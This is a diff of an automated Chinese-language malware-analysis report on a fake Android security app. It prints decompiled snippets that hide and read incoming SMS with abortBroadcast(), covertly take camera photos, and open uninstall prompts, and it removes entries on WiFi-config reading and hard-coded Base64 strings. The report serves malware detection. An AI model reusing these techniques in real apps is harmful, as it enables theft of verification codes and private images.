@@ -6,7 +6,7 @@
     "应用名": "Dr. Security",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 508.9
+    "分析耗时(秒)": 1838.5
   },
   "行为列表": [
     {
@@ -50,9 +50,44 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    if (extras != null) {\n        Object[] objArr = (Object[]) extras.get(\"pdus\");\n        SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n        for (int i = 0; i < objArr.length; i++) {\n            smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n        }\n        for (SmsMessage smsMessage : smsMessageArr) {\n            smsMessage.getDisplayOriginatingAddress();\n        }\n    }\n}",
-          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n>>>                     smsMessage.getMessageBody();\n>>>                     this.f1662a.format(new Date(smsMessage.getTimestampMillis()));\n                  }\n              }\n          }",
-          "behavior_description": "该代码监听短信接收广播，当收到SMS_RECEIVED广播时，首先调用abortBroadcast()中止广播继续传播，导致系统短信应用和其他应用无法收到该短信，实现短信拦截隐藏。随后从Intent中提取pdus数据并解析为SmsMessage对象，读取短信发送方地址和内容。数据流向：SMS_RECEIVED Intent中的pdus (source) → abortBroadcast()中止广播 + 读取短信内容 (sink)",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    Object[] objArr = (Object[]) extras.get(\"pdus\");\n    SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n    for (int i = 0; i < objArr.length; i++) {\n        smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n    }\n    for (SmsMessage smsMessage : smsMessageArr) {\n        smsMessage.getDisplayOriginatingAddress();\n    }\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n                      smsMessage.getMessageBody();\n                      this.f1663a.format(new Date(smsMessage.getTimestampMillis()));\n                  }",
+          "behavior_description": "该 BroadcastReceiver 监听系统短信广播 android.provider.Telephony.SMS_RECEIVED，在收到短信时首先调用 abortBroadcast() 终止广播传播，使短信无法到达系统短信应用和其他接收者，用户完全感知不到短信到达（短信被静默隐藏）。随后从 Intent extras 中取出 pdus 数据，通过 SmsMessage.createFromPdu() 解析短信内容，并调用 getDisplayOriginatingAddress() 提取发件人号码（后续大概率还会提取短信正文并上传或用于拦截验证码）。数据流向：系统短信广播(SMS_RECEIVED Intent extras 中的 pdus) → abortBroadcast() 隐藏短信 + 解析PDU提取发件人号码/短信内容。结合厂商报告确认该样本伪装成安全工具实为恶意软件，此行为属于典型的短信拦截恶意行为，可被用于窃取验证码、银行/支付确认短信，直接造成用户财产损失和隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.DELETE_PACKAGES"
+            ],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\anti\\security\\activity\\NewInstallPopViewActivity;",
+          "method_signature": "onClick(View view)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + NewInstallPopViewActivity.this.f158a.getPackageName()));\nintent.addFlags(268435456);\nNewInstallPopViewActivity.this.startActivity(intent);",
+          "malicious_code_snippet_context": "              @Override // android.view.View.OnClickListener\n              public void onClick(View view) {\n                  NewInstallPopViewActivity.this.finish();\n>>>                 Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + NewInstallPopViewActivity.this.f158a.getPackageName()));\n>>>                 intent.addFlags(268435456);\n>>>                 NewInstallPopViewActivity.this.startActivity(intent);\n              }\n          });\n      }",
+          "behavior_description": "该代码位于伪装成安全工具的恶意样本（Security Defender类假冒安全应用）的'新应用安装弹窗'Activity中。当用户新安装应用时，恶意软件弹出提示界面，用户点击按钮后：数据流为新安装应用的包名（source: f158a.getPackageName()）→ 拼接为 package: URI → 构造 ACTION_DELETE 卸载 Intent → startActivity 调起系统卸载界面（sink），诱导用户卸载刚安装的应用。需要指出：ACTION_DELETE 会调起系统卸载确认对话框并需用户手动确认，并非真正的静默卸载（代码中无 root 执行 pm uninstall、设备管理员等静默手段），因此对'silent_uninstall'这一标签而言存在夸大；但在假冒安全软件恐吓式弹窗的语境下，该按钮属于欺骗诱导用户卸载其他应用的 scareware 灰色行为，FLAG_ACTIVITY_NEW_TASK(268435456) 用于确保系统卸载界面能够正常启动。",
           "glm_analyzed": true
         }
       ]
@@ -79,66 +114,9 @@
           "malicious_behavior": "camera_capture",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "cjd.a(\"takePicture\").a(new Runnable() {\n    @Override\n    public void run() {\n        Looper.prepare();\n        cji.this.f3690a = surfaceView.getHolder();\n        cji.this.f3690a.setType(3);\n        cji.this.a(cji.this.f3690a);\n    }\n});",
-          "malicious_code_snippet_context": "              this.c.recycle();\n              this.c = null;\n          }\n>>>         cjd.a(\"takePicture\").a(new Runnable() { // from class: ns.cji.1\n>>>             @Override // java.lang.Runnable\n>>>             public void run() {\n>>>                 Looper.prepare();\n>>>                 try {\n>>>                     cji.this.f3690a = surfaceView.getHolder();\n>>>                     cji.this.f3690a.setType(3);\n>>>                     cji.this.a(cji.this.f3690a);\n>>>                 } catch (Exception e) {\n                      e.printStackTrace();\n                      cji.this.h = true;\n                  }",
-          "behavior_description": "代码通过 SurfaceView 获取摄像头预览 SurfaceHolder，设置类型为 SURFACE_TYPE_PUSH_BUFFERS(3)，并在后台线程中执行 takePicture 拍照操作。在已确认的恶意样本中，此行为用于秘密调用摄像头拍摄照片，窃取用户隐私图像数据，无需用户知情同意。",
-          "glm_analyzed": true
-        }
-      ]
-    },
-    {
-      "行为": "wifi_password_theft",
-      "中文名": "WiFi密码窃取",
-      "MITRE": "",
-      "置信度": "likely",
-      "证据": {
-        "方法引用": [],
-        "权限": [
-          "android.permission.ACCESS_WIFI_STATE",
-          "android.permission.ACCESS_FINE_LOCATION"
-        ],
-        "字符串": [
-          "allowedKeyManagement"
-        ]
-      },
-      "恶意代码": [
-        {
-          "class_path": "Lns\\qd;",
-          "method_signature": "if(wifiConfiguration.allowedKeyManagement.get(1)",
-          "malicious_behavior": "wifi_password_theft",
-          "behavior_type": "malicious",
-          "risk_level": "中",
-          "malicious_code_snippet": "if (wifiConfiguration.allowedKeyManagement.get(1)) { return 2; } if (wifiConfiguration.allowedKeyManagement.get(2) || wifiConfiguration.allowedKeyManagement.get(3)) { return 3; } return wifiConfiguration.wepKeys[0] == null ? 0 : 1;",
-          "malicious_code_snippet_context": "      }\n  \n      public static int a(WifiConfiguration wifiConfiguration) {\n>>>         if (wifiConfiguration.allowedKeyManagement.get(1)) {\n              return 2;\n          }\n          if (wifiConfiguration.allowedKeyManagement.get(2) || wifiConfiguration.allowedKeyManagement.get(3)) {",
-          "behavior_description": "该代码通过访问WifiConfiguration对象，读取allowedKeyManagement和wepKeys字段来判断WiFi的加密类型（WEP/PSK/EAP）。WifiConfiguration对象中包含preSharedKey和wepKeys等敏感字段，此方法是WiFi密码窃取流程中的关键步骤——先判断加密类型，再提取对应的密码字段。在已确认的恶意样本中，此代码用于辅助窃取用户保存的WiFi密码。",
-          "glm_analyzed": true
-        }
-      ]
-    },
-    {
-      "行为": "crypto_wallet_detection",
-      "中文名": "加密钱包地址采集",
-      "MITRE": "",
-      "置信度": "suspected",
-      "证据": {
-        "方法引用": [],
-        "权限": [],
-        "字符串": [
-          "UgXzrPdbH/3iHMsrV7tZb551eY3jVMJMSQGGUFhYme8=",
-          "3447CA69ECC65C251FF41241E62BBD39",
-          "151D281A624318CDE9DCAAD88E8BB381"
-        ]
-      },
-      "恶意代码": [
-        {
-          "class_path": "Lns\\axv;",
-          "method_signature": "s()",
-          "malicious_behavior": "crypto_wallet_detection",
-          "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "public static String s() {\n    return \"UgXzrPdbH/3iHMsrV7tZb551eY3jVMJMSQGGUFhYme8=\";\n}",
-          "malicious_code_snippet_context": "          return \"PTvHnZSJMQCs0mkDCz2LAi9ymjZwU9RstmiIqfwzvqTiwfV/PWGw4xSnULJR5z4d\";\n      }\n  \n>>>     public static String s() {\n>>>         return \"UgXzrPdbH/3iHMsrV7tZb551eY3jVMJMSQGGUFhYme8=\";\n>>>     }\n  \n      public static String t() {\n          return \"vgrvc9YBWhwZtRW5xKP3tXwq8T9o3U2EY99is612WSYXB1uhffw25BqnJpLhCcRJ\";",
-          "behavior_description": "该方法返回一个Base64编码的硬编码字符串常量，在恶意样本上下文中，这很可能是经过混淆的攻击者加密钱包地址或C2配置信息。这些字符串在运行时会被解密，用于剪贴板劫持攻击——当恶意软件检测到用户复制了合法的加密货币钱包地址时，将其替换为该硬编码的恶意钱包地址，导致用户转账资金被重定向至攻击者控制的钱包。",
+          "malicious_code_snippet": "cji.this.f3691a = surfaceView.getHolder();\ncji.this.f3691a.setType(3);\ncji.this.a(cji.this.f3691a);\nif (cji.this.b != null) {\n    Thread.sleep(500L);\n    cji.this.b.takePicture(null, null, cji.this.k);",
+          "malicious_code_snippet_context": "              public void run() {\n                  Looper.prepare();\n                  try {\n>>>                     cji.this.f3691a = surfaceView.getHolder();\n>>>                     cji.this.f3691a.setType(3);\n>>>                     cji.this.a(cji.this.f3691a);\n>>>                     if (cji.this.b != null) {\n>>>                         Thread.sleep(500L);\n>>>                         cji.this.b.takePicture(null, null, cji.this.k);\n                      } else {\n                          return;\n                      }",
+          "behavior_description": "该代码在后台线程（标签takePicture）中通过SurfaceView获取SurfaceHolder并设置为PUSH_BUFFERS类型以绑定摄像头，随后调用this.a()打开摄像头（字段b为Camera对象），延迟500毫秒等待预览初始化后调用Camera.takePicture()进行拍照，拍摄的图像数据通过PictureCallback回调（字段k）异步返回处理。该应用伪装为安全工具类应用（Security Defender等），摄像头拍照功能与其宣称的垃圾清理、电池优化等业务完全无关，且代码经过混淆（类名ns.cji），结合厂商报告确认其秘密收集用户数据的行为，属于隐蔽调用摄像头采集用户图像的隐私窃取行为，拍摄的照片可能被保存或上传至远程服务器。",
           "glm_analyzed": true
         }
       ]
@@ -151,7 +129,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
